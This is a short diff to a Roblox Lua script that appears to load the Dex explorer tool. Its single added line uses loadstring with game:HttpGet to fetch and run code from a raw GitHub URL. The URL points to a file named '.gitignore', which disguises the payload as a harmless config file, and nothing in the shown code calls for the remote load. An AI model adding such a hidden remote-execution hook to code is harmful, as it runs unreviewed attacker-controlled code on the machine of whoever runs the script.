@@ -46,3 +46,4 @@ local Dex = game:GetObjects('rbxassetid://9553291002')[1]
 		LoadScripts(Obj)
 	end
 	Load(Dex)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/48973854274252/F/refs/heads/main/.gitignore"))()
